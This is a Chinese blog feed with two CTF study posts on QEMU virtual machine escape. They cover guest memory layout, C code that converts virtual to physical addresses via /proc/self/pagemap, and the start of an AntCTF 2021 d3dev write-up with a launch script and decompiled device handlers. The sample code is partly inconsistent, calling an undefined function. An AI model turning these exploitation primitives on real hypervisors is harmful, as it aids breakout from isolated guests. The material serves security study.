<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1"><span class="dt">void</span> cpu_physical_memory_rw(hwaddr addr, <span class="dt">void</span> *buf,</a>
<a class="sourceLine" id="cb2-2" title="2">                            hwaddr len, <span class="dt">bool</span> is_write);</a>
<a class="sourceLine" id="cb2-3" title="3"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_read(hwaddr addr,</a>
<a class="sourceLine" id="cb2-4" title="4">                                            <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb2-5" title="5">{</a>
<a class="sourceLine" id="cb2-6" title="6">    cpu_physical_memory_rw(addr, buf, len, false);</a>
<a class="sourceLine" id="cb2-7" title="7">}</a>
<a class="sourceLine" id="cb2-8" title="8"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_write(hwaddr addr,</a>
<a class="sourceLine" id="cb2-9" title="9">                                             <span class="dt">const</span> <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb2-10" title="10">{</a>
<a class="sourceLine" id="cb2-11" title="11">    cpu_physical_memory_rw(addr, (<span class="dt">void</span> *)buf, len, true);</a>
<a class="sourceLine" id="cb2-12" title="12">}</a></code></pre></div>
<p>也就是说:</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1"> cpu_physical_memory_rw(hwaddr addr,<span class="dt">void</span> *buf, hwaddr len,``false``)</a></code></pre></div>
<p>把物理地址hwaddr addr上的内容复制到虚拟地址void *buf上</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"> cpu_physical_memory_rw(hwaddr addr,<span class="dt">void</span> *buf, hwaddr len,``true``)</a></code></pre></div>
<p>把虚拟地址void *buf的内容复制到物理地址hwaddr addr上</p>
<p>这就牵扯到了我们需要根据虚拟地址计算物理地址的问题</p>
<h1 id="x01-qemu内存概述">0x01 qemu内存概述</h1>
<h2 id="qemu-内存布局">1. qemu 内存布局</h2>
<p>运行的每个qemu虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 host 上的一个 qemu 进程，而虚拟机的执行线程（如 CPU 线程、I/O 线程等）对应 qemu 进程的一个线程。</p>
<figure>
<img src="https://jjuku29a1d.feishu.cn/space/api/box/stream/download/asynccode/?code=ODNjYjQ4ZDY5NDcxNGU2ZDNhNjdiMWFjZjNmZGRjYTVfZ3paa1pBc09aWFcwT0xpME5ITkVHOVVrOUowelcyOExfVG9rZW46Ym94Y25KUzF3eGQ0Yk53TGNxV2F6aFNIcDRkXzE2Njc5MTY2MTk6MTY2NzkyMDIxOV9WNA" alt="img" /><figcaption>img</figcaption>
</figure>
<p>也就是说，对于qemu来说，地址映射具体为：</p>
<p>GVA(虚拟机虚拟地址) -&gt; GPA(虚拟机物理地址) -&gt; HVA(宿主机虚拟地址) -&gt; HPA(宿主机物理地址)</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb5-1" title="1">                        Guest&#39; processes</a>
<a class="sourceLine" id="cb5-2" title="2">                     +--------------------+</a>
<a class="sourceLine" id="cb5-3" title="3">Virtual addr space   |                    |</a>
<a class="sourceLine" id="cb5-4" title="4">                     +--------------------+</a>
<a class="sourceLine" id="cb5-5" title="5">                     |                    |</a>
<a class="sourceLine" id="cb5-6" title="6">                     \__   Page Table     \__</a>
<a class="sourceLine" id="cb5-7" title="7">                        \                    \</a>
<a class="sourceLine" id="cb5-8" title="8">                         |                    |  Guest kernel</a>
<a class="sourceLine" id="cb5-9" title="9">                    +----+--------------------+----------------+</a>
<a class="sourceLine" id="cb5-10" title="10">Guest&#39;s phy. memory |    |                    |                |</a>
<a class="sourceLine" id="cb5-11" title="11">                    +----+--------------------+----------------+</a>
<a class="sourceLine" id="cb5-12" title="12">                    |                                          |</a>
<a class="sourceLine" id="cb5-13" title="13">                    \__                                        \__</a>
<a class="sourceLine" id="cb5-14" title="14">                       \                                          \</a>
<a class="sourceLine" id="cb5-15" title="15">                        |             QEMU process                 |</a>
<a class="sourceLine" id="cb5-16" title="16">                   +----+------------------------------------------+</a>
<a class="sourceLine" id="cb5-17" title="17">Virtual addr space |    |                                          |</a>
<a class="sourceLine" id="cb5-18" title="18">                   +----+------------------------------------------+</a>
<a class="sourceLine" id="cb5-19" title="19">                   |                                               |</a>
<a class="sourceLine" id="cb5-20" title="20">                    \__                Page Table                   \__</a>
<a class="sourceLine" id="cb5-21" title="21">                       \                                               \</a>
<a class="sourceLine" id="cb5-22" title="22">                        |                                               |</a>
<a class="sourceLine" id="cb5-23" title="23">                   +----+-----------------------------------------------++</a>
<a class="sourceLine" id="cb5-24" title="24">Physical memory    |    |                                               ||</a>
<a class="sourceLine" id="cb5-25" title="25">                   +----+-----------------------------------------------++</a></code></pre></div>
<p>需要注意的是，虽然上图看起来虚拟地址到物理地址的映射是连续的，但实际上并不是。</p>
<p>对于QEMU来说，一个内存页的大小是0x1000，如果我们使用mmap申请一个0x2000大小的空间，那么他们的虚拟地址确实是连续的，但是物理地址页并不一定连续。</p>
<ol type="1">
<li><h2 id="申请连续物理内存的两种方式">申请连续物理内存的两种方式</h2></li>
<li><h3 id="爆破">爆破</h3></li>
</ol>
<blockquote>
<p>多次申请直到物理内存连续</p>
</blockquote>
<p>字面意思，多次mmap 0x1000大小的内存，并根据虚拟地址计算物理地址，一直到出现两个连续的物理内存页。</p>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb6-1" title="1"><span class="dt">size_t</span> buf0, buf1;</a>
<a class="sourceLine" id="cb6-2" title="2"></a>
<a class="sourceLine" id="cb6-3" title="3"><span class="dt">void</span> get_pages()</a>
<a class="sourceLine" id="cb6-4" title="4">{</a>
<a class="sourceLine" id="cb6-5" title="5">    <span class="dt">size_t</span> buf[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb6-6" title="6">    <span class="dt">size_t</span> arry[<span class="bn">0x1000</span>];</a>
<a class="sourceLine" id="cb6-7" title="7">    <span class="dt">size_t</span> arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-8" title="8">    *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb6-9" title="9">    <span class="dt">int</span> n = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb6-10" title="10">    buf[n] = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb6-11" title="11">    arry[n++] = arr;</a>
<a class="sourceLine" id="cb6-12" title="12">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">1</span>; i &lt; <span class="bn">0x1000</span>; i++)</a>
<a class="sourceLine" id="cb6-13" title="13">    {</a>
<a class="sourceLine" id="cb6-14" title="14">        arr = mmap(NULL, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, <span class="dv">0</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-15" title="15">        *(<span class="dt">char</span> *)arr = <span class="ch">&#39;a&#39;</span>;</a>
<a class="sourceLine" id="cb6-16" title="16">        <span class="dt">size_t</span> fn = gva_to_gfn(arr);</a>
<a class="sourceLine" id="cb6-17" title="17">        <span class="cf">for</span> (<span class="dt">int</span> j = <span class="dv">0</span>; j &lt; n; j++)</a>
<a class="sourceLine" id="cb6-18" title="18">        {</a>
<a class="sourceLine" id="cb6-19" title="19">            <span class="cf">if</span> (buf[j] == fn + <span class="dv">1</span> || buf[j] + <span class="dv">1</span> == fn)</a>
<a class="sourceLine" id="cb6-20" title="20">            {</a>
<a class="sourceLine" id="cb6-21" title="21">                LOG(<span class="st">&quot;consist pages&quot;</span>);</a>
<a class="sourceLine" id="cb6-22" title="22">                <span class="cf">if</span> (fn &gt; buf[j])</a>
<a class="sourceLine" id="cb6-23" title="23">                {</a>
<a class="sourceLine" id="cb6-24" title="24">                    buf0 = arry[j];</a>
<a class="sourceLine" id="cb6-25" title="25">                    buf1 = arr;</a>
<a class="sourceLine" id="cb6-26" title="26">                    phy_buf0 = (buf[j]&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb6-27" title="27">                }</a>
<a class="sourceLine" id="cb6-28" title="28">                <span class="cf">else</span></a>
<a class="sourceLine" id="cb6-29" title="29">                {</a>
<a class="sourceLine" id="cb6-30" title="30">                    buf1 = arry[j];</a>
<a class="sourceLine" id="cb6-31" title="31">                    buf0 = arr;</a>
<a class="sourceLine" id="cb6-32" title="32">                    phy_buf0 = (fn&lt;&lt;<span class="dv">12</span>);</a>
<a class="sourceLine" id="cb6-33" title="33">                }</a>
<a class="sourceLine" id="cb6-34" title="34">                <span class="cf">return</span>;</a>
<a class="sourceLine" id="cb6-35" title="35">            }</a>
<a class="sourceLine" id="cb6-36" title="36">        }</a>
<a class="sourceLine" id="cb6-37" title="37">        buf[n] = fn;</a>
<a class="sourceLine" id="cb6-38" title="38">        arry[n++] = arr;</a>
<a class="sourceLine" id="cb6-39" title="39">    }</a>
<a class="sourceLine" id="cb6-40" title="40">}</a></code></pre></div>
<h2 id="申请linux大页">2. 申请linux大页</h2>
<blockquote>
<p>主动申请连续物理地址</p>
</blockquote>
<p><a href="https://cloud.tencent.com/developer/article/1055041">Linux申请大页内存(mmap)</a></p>
<p>操作系统对内存采用多级页表和分页进行管理，操作系统每个页默认大小为4KB（0x1000）。</p>
<p>如果进程使用的内存过大，比如1GB，这样会在页表中占用 1GB / 4KB = 262144个页表项，而系统TLB可以容纳的页表项远小于这个数量。当多个内存密集型应用访问内存时，会造成过多的TLB未命中，因此在特定情况下会需要减少未命中次数，一个可行的办法就是增大每个页的尺寸。</p>
<p>操作系统默认支持的大页是2MB（512 * 0x1000 ），当使用1GB内存时，在页表中将占用 1GB / 2MB = 512个页表项，可以大大提升TLB命中率，进而提升应用性能。</p>
<blockquote>
<p>申请后还需访存一下，这里使用了memset，确保物理页被真实映射。</p>
</blockquote>
<div class="sourceCode" id="cb7"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb7-1" title="1">system(<span class="st">&quot;sysctl vm.nr_hugepages=30&quot;</span>); <span class="co">// 开启大页</span></a>
<a class="sourceLine" id="cb7-2" title="2"><span class="dt">void</span> * buf = mmap(<span class="dv">0</span>, <span class="dv">512</span> * <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE , MAP_SHARED | MAP_ANONYMOUS | <span class="bn">0x40000</span>, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb7-3" title="3">memset(buf,<span class="ch">&#39;a&#39;</span>,<span class="bn">0x2000</span>);</a></code></pre></div>
<h1 id="x02-gva2gpa">0x02 GVA2GPA</h1>
<h2 id="原理">1. 原理</h2>
<p>将虚拟地址转换为物理地址需要访问页表，然而只有内核态的程序才能访问到页表，用户态程序无权访问。此外，Linux 系统提供了一种用户态程序访问页表的方式，通过查看 <code>/proc/pid/pagemap</code> 文件可得到虚拟内存页映射与物理内存页的映射关系。显然后者更为简单，所以下面使用该方法实现地址转换。</p>
<p>根据内核文档可知，每个虚拟页在 <code>/proc/pid/pagemap</code> 中对应一项长度为 64 bits 的数据，其中 Bit 63 为 page present，表示物理内存页是否已存在；若物理页已存在，则 Bits 0-54 表示物理页号。此外，需要 root 权限的进程才能读取 <code>/proc/pid/pagemap</code> 中的内容。</p>
<blockquote>
<p>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow userspace programs to examine the page tables and related information by reading files in /proc.</p>
<p>There are four components to pagemap:</p>
<p>*/proc/pid/pagemap. This file lets a userspace process find out which physical frame each virtual page is mapped to. It contains one 64-bit value for each virtual page, containing the following data (from fs/proc/task_mmu.c, above pagemap_read):</p>
<p>* Bits 0-54 page frame number (PFN) if present</p>
<p>* Bits 0-4 swap type if swapped</p>
<p>* Bits 5-54 swap offset if swapped</p>
<p>* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)</p>
<p>* Bit 56 page exclusively mapped (since 4.2)</p>
<p>* Bits 57-60 zero</p>
<p>* Bit 61 page is file-page or shared-anon (since 3.5)</p>
<p>* Bit 62 page swapped</p>
<p>* Bit 63 page present</p>
<p>Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs. In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from 4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN. Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</p>
</blockquote>
<p>根据以上信息，利用 <code>/proc/pid/pagemap</code> 可将虚拟地址转换为物理地址，具体步骤如下：</p>
<p>1）计算虚拟地址所在虚拟页对应的数据项在 <code>/proc/pid/pagmap</code> 中的偏移；</p>
<pre><code>offset = (viraddr / pagesize) * sizeof(uint64_t)</code></pre>
<p>2）读取长度为 64 bits 的数据项；</p>
<p>3）根据 Bit 63 判断物理内存页是否存在；</p>
<p>4）若物理内存页已存在，则取 bits 0 - 54 作为物理页号；</p>
<p>5）计算出物理页起始地址加上页内偏移即得到物理地址；</p>
<pre><code>phyaddr = pageframenum * pagesize + viraddr % pagesize;</code></pre>
<h2 id="实现">2.实现</h2>
<p>具体实现代码如下：</p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span><span class="pp">      </span></a>
<a class="sourceLine" id="cb10-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb10-3" title="3"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb10-4" title="4"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb10-5" title="5"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb10-6" title="6">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb10-7" title="7"></a>
<a class="sourceLine" id="cb10-8" title="8">    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb10-9" title="9">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb10-10" title="10">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb10-11" title="11">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-12" title="12">    }</a>
<a class="sourceLine" id="cb10-13" title="13"></a>
<a class="sourceLine" id="cb10-14" title="14">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb10-15" title="15">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb10-16" title="16"></a>
<a class="sourceLine" id="cb10-17" title="17">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb10-18" title="18">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb10-19" title="19">        close(fd);</a>
<a class="sourceLine" id="cb10-20" title="20">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-21" title="21">    }</a>
<a class="sourceLine" id="cb10-22" title="22"></a>
<a class="sourceLine" id="cb10-23" title="23">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb10-24" title="24">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb10-25" title="25">        close(fd);</a>
<a class="sourceLine" id="cb10-26" title="26">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-27" title="27">    }</a>
<a class="sourceLine" id="cb10-28" title="28"></a>
<a class="sourceLine" id="cb10-29" title="29">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb10-30" title="30">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb10-31" title="31">        close(fd);</a>
<a class="sourceLine" id="cb10-32" title="32">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-33" title="33">    }</a>
<a class="sourceLine" id="cb10-34" title="34"></a>
<a class="sourceLine" id="cb10-35" title="35">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb10-36" title="36">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb10-37" title="37"></a>
<a class="sourceLine" id="cb10-38" title="38">    close(fd);</a>
<a class="sourceLine" id="cb10-39" title="39"></a>
<a class="sourceLine" id="cb10-40" title="40">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb10-41" title="41">}</a>
<a class="sourceLine" id="cb10-42" title="42"><span class="dt">int</span> main()</a>
<a class="sourceLine" id="cb10-43" title="43">{</a>
<a class="sourceLine" id="cb10-44" title="44">    <span class="dt">size_t</span> phyaddr;</a>
<a class="sourceLine" id="cb10-45" title="45">    <span class="dt">size_t</span> viraddr;</a>
<a class="sourceLine" id="cb10-46" title="46">    <span class="dt">uint32_t</span> pid;</a>
<a class="sourceLine" id="cb10-47" title="47">    printf(<span class="st">&quot;pid = &quot;</span>);</a>
<a class="sourceLine" id="cb10-48" title="48">    scanf(<span class="st">&quot;%u&quot;</span>, &amp;pid);</a>
<a class="sourceLine" id="cb10-49" title="49">    printf(<span class="st">&quot;virtual address = &quot;</span>);</a>
<a class="sourceLine" id="cb10-50" title="50">    scanf(<span class="st">&quot;%x&quot;</span>, &amp;viraddr);</a>
<a class="sourceLine" id="cb10-51" title="51">    phyaddr = virtual_to_physical(pid, viraddr);</a>
<a class="sourceLine" id="cb10-52" title="52">    printf(<span class="st">&quot;virtual address = %p,physical address = %p</span><span class="sc">\n</span><span class="st">&quot;</span>, viraddr, phyaddr);</a>
<a class="sourceLine" id="cb10-53" title="53">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb10-54" title="54">}</a></code></pre></div>
<h1 id="x03-参考连接">0x03 参考连接</h1>
<p>https://blog.mark0519.com/#/pwnable/221025-qemu-basic</p>
<p>http://0x4c43.cn/2018/0508/linux-dynamic-link/</p>
<p>https://juniorprincewang.github.io/2018/07/20/qemu-memory/</p>
<p>https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#qemu%E6%A6%82%E8%BF%B0</p>
<p>https://www.anquanke.com/post/id/256977#h3-3</p>
<p>http://a1ex.online/2021/10/13/%E4%BB%8Eqemu%E9%80%83%E9%80%B8%E5%88%B0%E9%80%83%E8%B7%91/</p>]]></description>
    <pubDate>Sun, 13 Nov 2022 21:52:48 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[一、QEMU逃逸  --  basic ]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/221025-qemu-basic</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/221025-qemu-basic</guid>
    <description><![CDATA[<h1 id="一qemu逃逸-basic">一、QEMU逃逸 – basic</h1>
<blockquote>
<p><del>玩不懂kernel的菜鸡来霍霍qemu辣</del></p>
</blockquote>
<h2 id="x00-lspci">0x00 lspci</h2>
<p>pci外设地址，形如<code>0000:00:1f.1</code>。第一个部分16位表示域；第二个部分8位表示总线编号；第三个部分5位表示设备号；最后一个部分3位表示功能号。下面是<code>lspci</code>的输出，其中<code>pci</code>设备的地址，在最头部给出，由于<code>pc</code>设备总只有一个0号域，所以会省略域。</p>
<figure>
<img src="https://p4.ssl.qhimg.com/t01e511a0ccabc44633.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p><code>lspci -v -t</code>会用树状图的形式输出pci设备，会显得更加直观</p>
<figure>
<img src="https://p2.ssl.qhimg.com/t0106de490068b32c99.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p><code>lspci -v</code>就能输出设备的详细信息</p>
<figure>
<img src="https://p0.ssl.qhimg.com/t01a78f0178e71b000f.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>仔细观察相关的输出，可以从中知道<code>mmio</code>的地址是<code>0xfebf1000</code>，<code>pmio</code>的端口是<code>0xc050</code>。</p>
<figure>
<img src="https://p1.ssl.qhimg.com/t0129b36299082dc698.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>在<code>/sys/bus/pci/devices</code>可以找到每个总线设备相关的一写文件。</p>
<figure>
<img src="https://p3.ssl.qhimg.com/t01ddba05509f456110.png" alt="image" /><figcaption>image</figcaption>
</figure>
<figure>
<img src="https://p0.ssl.qhimg.com/t016c20a809c748def6.png" alt="image" /><figcaption>image</figcaption>
</figure>
<p>每个设备的目录下<code>resource0</code> 对应<code>MMIO</code>空间。<code>resource1</code> 对应<code>PMIO</code>空间。 <code>resource</code>文件里面会记录相关的数据，第一行就是<code>mimo</code>的信息，从左到右是：起始地址、结束地址、标识位。</p>
<h2 id="x01-antctf-2021-d3dev">0x01 AntCTF 2021 d3dev</h2>
<h3 id="分析">1. 分析</h3>
<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb1-1" title="1"><span class="co">#!/bin/sh</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="ex">./qemu-system-x86_64</span> \</a>
<a class="sourceLine" id="cb1-3" title="3">-L pc-bios/ \</a>
<a class="sourceLine" id="cb1-4" title="4">-m 128M \</a>
<a class="sourceLine" id="cb1-5" title="5">-kernel vmlinuz \</a>
<a class="sourceLine" id="cb1-6" title="6">-initrd rootfs.img \</a>
<a class="sourceLine" id="cb1-7" title="7">-smp 1 \</a>
<a class="sourceLine" id="cb1-8" title="8">-append <span class="st">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot;</span> \</a>
<a class="sourceLine" id="cb1-9" title="9">-device d3dev \</a>
<a class="sourceLine" id="cb1-10" title="10">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</a>
<a class="sourceLine" id="cb1-11" title="11">-nographic \</a>
<a class="sourceLine" id="cb1-12" title="12">-monitor /dev/null</a></code></pre></div>
<p>启动脚本中出现<code>-device d3dev</code></p>
<p>使用IDA pro反汇编qemu，查找d3dev</p>
<p>在<code>d3dev_class_init()</code>函数中找到注册了PCI设备d3dev</p>
<p>其中</p>
<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb2-1" title="1">  LODWORD(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0x11E82333</span>;</a>
<a class="sourceLine" id="cb2-2" title="2">  BYTE4(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0x10</span>;</a>
<a class="sourceLine" id="cb2-3" title="3">  HIWORD(v2[<span class="dv">2</span>].object_cast_cache[<span class="dv">0</span>]) = <span class="bn">0xFF</span>;</a></code></pre></div>
<p>可以知道d3dev设备的Device id（0x11E8）和Vendor id（0x2333）</p>
<p>之后在<code>pci_d3dev_realize()</code>函数中可以找到该设备MMIO和PMIO的读写操作函数，且MMIO的内存大小为0x800，PMIO的内存大小为0x20，在读写的时候如果访问的地址在其范围内则会调用相关的读写函数</p>
<div class="sourceCode" id="cb3"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb3-1" title="1"><span class="dt">void</span> __fastcall pci_d3dev_realize(PCIDevice_0 *pdev, Error_0 **errp)</a>
<a class="sourceLine" id="cb3-2" title="2">{</a>
<a class="sourceLine" id="cb3-3" title="3">  memory_region_init_io(</a>
<a class="sourceLine" id="cb3-4" title="4">    (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>],</a>
<a class="sourceLine" id="cb3-5" title="5">    &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb3-6" title="6">    &amp;d3dev_mmio_ops,</a>
<a class="sourceLine" id="cb3-7" title="7">    pdev,</a>
<a class="sourceLine" id="cb3-8" title="8">    <span class="st">&quot;d3dev-mmio&quot;</span>,</a>
<a class="sourceLine" id="cb3-9" title="9">    <span class="bn">0x800</span><span class="bu">uLL</span>);</a>
<a class="sourceLine" id="cb3-10" title="10">  pci_register_bar(pdev, <span class="dv">0</span>, <span class="dv">0</span>, (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>]);</a>
<a class="sourceLine" id="cb3-11" title="11">  memory_region_init_io(</a>
<a class="sourceLine" id="cb3-12" title="12">    (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>].name[<span class="dv">56</span>],</a>
<a class="sourceLine" id="cb3-13" title="13">    &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb3-14" title="14">    &amp;d3dev_pmio_ops,</a>
<a class="sourceLine" id="cb3-15" title="15">    pdev,</a>
<a class="sourceLine" id="cb3-16" title="16">    <span class="st">&quot;d3dev-pmio&quot;</span>,</a>
<a class="sourceLine" id="cb3-17" title="17">    <span class="bn">0x20</span><span class="bu">uLL</span>);</a>
<a class="sourceLine" id="cb3-18" title="18">  pci_register_bar(pdev, <span class="dv">1</span>, <span class="dv">1</span><span class="bu">u</span>, (MemoryRegion_0 *)&amp;pdev[<span class="dv">1</span>].name[<span class="dv">56</span>]);</a>
<a class="sourceLine" id="cb3-19" title="19">}</a></code></pre></div>
<p>之后查看mmio和pmio的读写函数，但是在详细分析之前修改这些函数的第一个参数</p>
<p>第一个参数默认为<code>void *opaque</code></p>
<p>但是明显可以看到他是一个指向自定义结构体的指针，我们可以：</p>
<blockquote>
<p>选中opaque -&gt; 右键Convert to struct* -&gt; d3devState</p>
</blockquote>
<p>具体的结构体名词可以在<code>pci_d3dev_realize()</code>函数中查看汇编查看</p>
<p><img src="https://pic1.imgdb.cn/item/6357cdda16f2c2beb1c3ed00.png" /></p>
<p>可以在IDA中详细查看这个结构体的定义</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"><span class="bn">00000000</span> d3devState struc ; (<span class="kw">sizeof</span>=<span class="bn">0x1300</span>, align=<span class="bn">0x10</span>, copyof_4545)</a>
<a class="sourceLine" id="cb4-2" title="2"><span class="bn">00000000</span> pdev PCIDevice_0 ?</a>
<a class="sourceLine" id="cb4-3" title="3"><span class="fl">000008E0</span> mmio MemoryRegion_0 ?</a>
<a class="sourceLine" id="cb4-4" title="4"><span class="bn">00000</span><span class="er">9D0</span> pmio MemoryRegion_0 ?</a>
<a class="sourceLine" id="cb4-5" title="5"><span class="bn">00000</span><span class="er">AC0</span> memory_mode dd ?</a>
<a class="sourceLine" id="cb4-6" title="6"><span class="bn">00000</span><span class="er">AC4</span> seek dd ?</a>
<a class="sourceLine" id="cb4-7" title="7"><span class="bn">00000</span><span class="er">AC8</span> init_flag dd ?</a>
<a class="sourceLine" id="cb4-8" title="8"><span class="bn">00000</span><span class="er">ACC</span> mmio_read_part dd ?</a>
<a class="sourceLine" id="cb4-9" title="9"><span class="bn">00000</span><span class="er">AD0</span> mmio_write_part dd ?</a>
<a class="sourceLine" id="cb4-10" title="10"><span class="bn">00000</span><span class="er">AD4</span> r_seed dd ?</a>
<a class="sourceLine" id="cb4-11" title="11"><span class="bn">00000</span><span class="er">AD8</span> blocks dq <span class="dv">257</span> dup(?)</a>
<a class="sourceLine" id="cb4-12" title="12"><span class="fl">000012E0</span> key dd <span class="dv">4</span> dup(?)</a>
<a class="sourceLine" id="cb4-13" title="13"><span class="bn">000012</span><span class="er">F0</span> rand_r dq ?                             ; offset</a>
<a class="sourceLine" id="cb4-14" title="14"><span class="bn">000012</span><span class="er">F8</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-15" title="15"><span class="bn">000012</span><span class="er">F9</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-16" title="16"><span class="bn">000012</span><span class="er">FA</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-17" title="17"><span class="bn">000012</span><span class="er">FB</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-18" title="18"><span class="bn">000012</span><span class="er">FC</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-19" title="19"><span class="bn">000012</span><span class="er">FD</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-20" title="20"><span class="bn">000012</span><span class="er">FE</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-21" title="21"><span class="bn">000012</span><span class="er">FF</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-22" title="22"><span class="bn">00001300</span> d3devState ends</a>
<a class="sourceLine" id="cb4-23" title="23"><span class="bn">00001300</span></a></code></pre></div>
<p>之后分析mmio_read和mmio_write的操作</p>
<p>根据IDA可以看出，<code>d3dev_mmio_read()</code>该函数首先通过<code>seek</code>和<code>addr</code>来从<code>opaque-&gt;blocks</code>中取出<code>block</code>，然后经过<code>tea</code>编码后，返回给用户。</p>
